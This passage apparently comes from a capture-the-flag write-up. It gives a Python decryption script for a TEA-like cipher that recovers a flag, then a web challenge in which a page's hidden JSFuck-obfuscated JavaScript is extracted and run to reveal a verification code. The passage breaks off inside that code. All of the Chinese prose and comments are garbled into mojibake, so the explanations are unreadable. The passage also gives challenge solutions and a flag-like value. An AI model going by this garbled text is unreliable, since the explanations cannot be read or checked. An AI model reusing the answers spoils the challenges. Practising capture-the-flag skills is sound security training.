def f_round(value: int, round_sum: int) -> int:
    """
    æ ¹æ®ç»™å®šå€¼å’Œè½®æ€»å’Œï¼Œä¸ºæ•°æ®å—çš„ç¬¬ä¸€éƒ¨åˆ†è®¡ç®—å·®å€¼ã€‚
    åŸå§‹é€»è¾‘: v6 ^ (v5+v6) ^ (16*v5 + key[0]) ^ ((v5>>5) + key[1])
    """
    value_u = to_u32(value)
    sum_u = to_u32(round_sum)
    return to_u32(
        sum_u ^ to_u32(value_u + sum_u)
        ^ to_u32(16 * value_u + KEY[0])
        ^ to_u32((value_u >> 5) + KEY[1])
    )

def g_round(value: int, round_sum: int) -> int:
    """
    æ ¹æ®ç»™å®šå€¼å’Œè½®æ€»å’Œï¼Œä¸ºæ•°æ®å—çš„ç¬¬äºŒéƒ¨åˆ†è®¡ç®—å·®å€¼ã€‚
    åŸå§‹é€»è¾‘: v6 ^ (v4+v6) ^ (16*v4 + key[2]) ^ ((v4>>5) + key[3])
    """
    value_u = to_u32(value)
    sum_u = to_u32(round_sum)
    return to_u32(
        sum_u ^ to_u32(value_u + sum_u)
        ^ to_u32(16 * value_u + KEY[2])
        ^ to_u32((value_u >> 5) + KEY[3])
    )

def decrypt_block(v0: int, v1: int) -> tuple[int, int]:
    """
    è§£å¯†ä¸€ä¸ª 64 ä½çš„æ•°æ®å— (ç”±ä¸¤ä¸ª 32 ä½æ•´æ•°ç»„æˆ)ã€‚
    v0, v1 åˆ†åˆ«æ˜¯æ•°æ®å—çš„å‰ 32 ä½å’Œå 32 ä½ã€‚
    """
    decrypted_v0 = to_u32(v0)
    decrypted_v1 = to_u32(v1)
    
    # åŠ å¯†å…±è¿›è¡Œ 32 è½®ï¼Œè§£å¯†éœ€è¦é€†å‘æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ã€‚
    num_rounds = 32
    for i in reversed(range(num_rounds)):
        # å€’åºè®¡ç®—æ¯ä¸€è½®çš„è½®æ€»å’Œ (round_sum)
        round_sum = to_u32(-DELTA * (i + 1))
        
        # é€†å‘æ‰§è¡ŒåŠ å¯†æ“ä½œ
        decrypted_v1 = to_u32(decrypted_v1 - g_round(decrypted_v0, round_sum))
        decrypted_v0 = to_u32(decrypted_v0 - f_round(decrypted_v1, round_sum))
        
    return decrypted_v0, decrypted_v1

def main():
    """
    ä¸»å‡½æ•°ï¼Œæ‰§è¡Œå®Œæ•´çš„è§£å¯†æµç¨‹å¹¶è¾“å‡ºæœ€ç»ˆçš„ flagã€‚
    """
    print("å¼€å§‹è§£å¯†...")
    
    # å°†æ‰å¹³çš„å¯†æ–‡åˆ—è¡¨æŒ‰ 2 ä¸ªä¸€ç»„ï¼ˆ64ä½ï¼‰åˆ†å‰²æˆæ•°æ®å—
    ciphertext_blocks = list(zip(CIPHERTEXT[::2], CIPHERTEXT[1::2]))
    
    decrypted_bytes = bytearray()
    
    for i, (v0, v1) in enumerate(ciphertext_blocks):
        plain_v0, plain_v1 = decrypt_block(v0, v1)
        
        # å°†è§£å¯†åçš„ 32 ä½æ•´æ•°ä»¥å°ç«¯åºè½¬æ¢å›å­—èŠ‚ï¼Œå¹¶æ‹¼æ¥åˆ°ç»“æœä¸­
        decrypted_bytes.extend(plain_v0.to_bytes(4, 'little'))
        decrypted_bytes.extend(plain_v1.to_bytes(4, 'little'))

    # å°è¯•å°†å­—èŠ‚ä¸²ç”¨ ASCII è§£ç ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™ä»¥åå…­è¿›åˆ¶å½¢å¼æ˜¾ç¤ºã€‚
    try:
        # è§£ç åå»é™¤æœ«å°¾å¯èƒ½å­˜åœ¨çš„ç©ºå­—èŠ‚ '\x00'
        flag = decrypted_bytes.decode('ascii').rstrip('\x00')
    except UnicodeDecodeError:
        flag = decrypted_bytes.hex()

    print("\nè§£å¯†å®Œæˆï¼")
    print(f"å¾—åˆ°çš„æ˜æ–‡ flag æ˜¯: {flag}")


if __name__ == "__main__":
    main()
```

`b3d06a66f8aa86e3e6390f615e389e55`
## WEB
### ezDecryption
è®¿é—®ç½‘é¡µï¼Œæç¤ºéœ€è¦éªŒè¯ç   
![](assets/img/attachments/file-20250806095432652%201.png)  

æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°éšè—ä¿¡æ¯ JS æ–‡ä»¶   

![](assets/img/attachments/file-20250806095511399%201.png)  

```javascript
// ç³»ç»Ÿåˆå§‹åŒ–è„šæœ¬
(function() {
    const systemConfig = {
        version: "2.0.1",
        debug: false
    };
    
    function initSystem() {
        console.log("ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ");
        
        window._sysData = btoa(JSON.stringify(_systemData));
    }
    
    initSystem();
    

    window._verificationCode = btoa(_0x7e9);
    
})();

// ç³»ç»ŸåŠŸèƒ½æ¨¡å—
const systemModule = {
    // è·å–ç³»ç»Ÿä¿¡æ¯
    getSystemInfo: function() {
        return {
            version: "panshi",
            status: "active"
        };
    },
    
    // éªŒè¯åŠŸèƒ½
    validateCode: function() {
        // è¿™é‡ŒåŒ…å«éªŒè¯é€»è¾‘
        const _0x1 = [][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+!+[]]+(!![]+[])[+[]]])[(![]+[])[+!+[]]+(!![]+[])[+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]](+[![]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]])
        const _0x2 = atob("Mm9aNQ==");
        const secretCode = _0x1 + _0x2;
        return secretCode;
    }
};

// å¯¼å‡ºæ¨¡å—ï¼ˆå¦‚æœéœ€è¦ï¼‰
if (typeof module !== 'undefined' && module.exports) {
    module.exports = systemModule;
} 
```

è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼ŒvalidateCode åŠŸèƒ½æ˜¯å°† JS æ··æ·†çš„å¯†æ–‡è§£å¯†ï¼Œå’Œå¦å¤– base64 è§£å¯†çš„å¯†æ–‡æ‹¼æ¥æˆ secretCode å¹¶è¿”å›
ç›´æ¥è°ƒç”¨è¯¥å‡½æ•°å‘ç°æŠ¥é”™ï¼Œæ²¡æœ‰è¢«å®šä¹‰ï¼Œå®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªå…¨å±€å‡½æ•°  

![](assets/img/attachments/file-20250806095751039%201.png)  

å°†å…¶å…³é”®æ®µå–å‡ºï¼Œè‡ªå®šä¹‰ä¸€ä¸ªå‡½æ•°å¹¶ JS æ‰§è¡Œ  
```javascript
var a = function() {
  const _0x1 = [][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+!+[]]+(!![]+[])[+[]]])[(![]+[])[+!+[]]+(!![]+[])[+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[